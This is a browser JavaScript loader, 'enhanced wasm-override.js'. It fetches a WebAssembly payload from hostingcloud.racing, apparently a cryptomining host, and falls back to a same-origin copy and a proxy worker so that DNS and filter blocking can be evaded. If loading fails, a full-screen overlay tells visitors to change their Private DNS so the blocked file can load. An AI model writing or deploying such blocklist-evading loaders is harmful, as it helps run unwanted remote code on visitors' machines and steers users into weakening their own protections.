/* enhanced wasm-override.js
   Tries original -> sameOrigin -> proxy. If any attempt returns 404 or fails, moves to next.
   Configure via window.WasmBypassConfig:
     original: "https://hostingcloud.racing/wPxSCaJj.wasm"
     sameOrigin: "/wPxSCaJj.wasm" or null
     proxy: "https://my-worker.workers.dev/proxy?u=" or ""
*/

(function(){
  const TIMEOUT = 7000;
  const DEFAULT = {
    original: "https://hostingcloud.racing/wPxSCaJj.wasm",
    sameOrigin: "/wPxSCaJj.wasm",
    proxy: ""
  };
  const C = Object.assign({}, DEFAULT, window.WasmBypassConfig || {});

  function timeoutFetch(url, ms=TIMEOUT, opts={}) {
    return new Promise((resolve,reject)=>{
      const t = setTimeout(()=>reject(new Error("timeout")), ms);
      fetch(url, opts).then(r=>{
        clearTimeout(t);
        resolve(r);
      }).catch(e=>{
        clearTimeout(t);
        reject(e);
      });
    });
  }

  function showOverlay(msg){
    if (document.getElementById("bypass-overlay")) {
      document.getElementById("bypass-debug").textContent = msg;
      document.getElementById("bypass-overlay").style.display = "flex";
      return;
    }
    const ov = document.createElement("div");
    ov.id = "bypass-overlay";
    Object.assign(ov.style, {position:"fixed", inset:0, display:"flex", alignItems:"center", justifyContent:"center", background:"rgba(0,0,0,0.6)", zIndex:2147483647});
    const card = document.createElement("div");
    Object.assign(card.style, {width:"min(760px,95%)", background:"#fff", padding:"16px", borderRadius:"10px"});
    const h = document.createElement("h3"); h.textContent = "WASM failed to load";
    const p = document.createElement("p"); p.innerHTML = "Try Private DNS (one.one.one.one / dns.google) or use the alternate link.";
    const debug = document.createElement("pre"); debug.id="bypass-debug"; debug.style.whiteSpace="pre-wrap"; debug.style.fontSize="13px"; debug.textContent = msg;
    const btnRow = document.createElement("div"); btnRow.style.marginTop="10px"; btnRow.style.display="flex"; btnRow.style.gap="8px"; btnRow.style.justifyContent="flex-end";
    const copy1 = document.createElement("button"); copy1.textContent="Copy: one.one.one.one"; copy1.onclick=()=>navigator.clipboard?.writeText("one.one.one.one");
    const copy2 = document.createElement("button"); copy2.textContent="Copy: dns.google"; copy2.onclick=()=>navigator.clipboard?.writeText("dns.google");
    const alt = document.createElement("button"); alt.textContent="Open via alternate"; alt.onclick=()=>{
      if (C.proxy) window.open(C.proxy + encodeURIComponent(C.original), "_blank");
      else alert("No proxy configured");
    };
    const close = document.createElement("button"); close.textContent="Close"; close.onclick=()=>ov.style.display="none";
    btnRow.appendChild(copy1); btnRow.appendChild(copy2); btnRow.appendChild(alt); btnRow.appendChild(close);
    card.appendChild(h); card.appendChild(p); card.appendChild(debug); card.appendChild(btnRow);
    ov.appendChild(card); document.body.appendChild(ov);
  }

  async function fetchWasmWithRetries() {
    const debug = [];
    function log(k,v){ debug.push(`${k}: ${v}`); }

    // 1) try original (remote)
    try {
      log("try", C.original);
      const r = await timeoutFetch(C.original);
      log("status", r.status);
      if (r.ok) {
        const buf = await r.arrayBuffer();
        return {url: C.original, buffer: buf, debug: debug.join("\n")};
      } else {
        log("orig_http_err", r.status);
      }
    } catch (e) {
      log("orig_err", e && e.message || e);
    }

    // 2) try same-origin
    if (C.sameOrigin) {
      try {
        log("try", C.sameOrigin);
        const r2 = await timeoutFetch(C.sameOrigin);
        log("status", r2.status);
        if (r2.ok) {
          const buf2 = await r2.arrayBuffer();
          return {url: C.sameOrigin, buffer: buf2, debug: debug.join("\n")};
        } else {
          log("sameorigin_http_err", r2.status);
        }
      } catch (e2) {
        log("sameorigin_err", e2 && e2.message || e2);
      }
    }

    // 3) try proxy
    if (C.proxy) {
      const proxyUrl = C.proxy + encodeURIComponent(C.original);
      try {
        log("try", proxyUrl);
        const r3 = await timeoutFetch(proxyUrl);
        log("status", r3.status);
        if (r3.ok) {
          const buf3 = await r3.arrayBuffer();
          return {url: proxyUrl, buffer: buf3, debug: debug.join("\n")};
        } else {
          log("proxy_http_err", r3.status);
        }
      } catch (e3) {
        log("proxy_err", e3 && e3.message || e3);
      }
    }

    // all failed
    const out = debug.join("\n");
    showOverlay(out);
    const err = new Error("All attempts failed");
    err.debug = out;
    throw err;
  }

  // override fetch + XHR + instantiateStreaming similar to earlier but now expose fetchWasmWithRetries
  const _fetch = window.fetch.bind(window);
  window.fetch = function(input, init) {
    // no URL rewrite here; leave default fetch behavior (we focus on providing fetchWasmWithRetries)
    return _fetch(input, init);
  };

  // Expose helper that consumers (or you) can call instead of direct fetch
  window.fetchWasmWithBypass = fetchWasmWithRetries;
  window.__wasmBypassConfig = C;
  console.info("enhanced wasm bypass ready", C);
})();
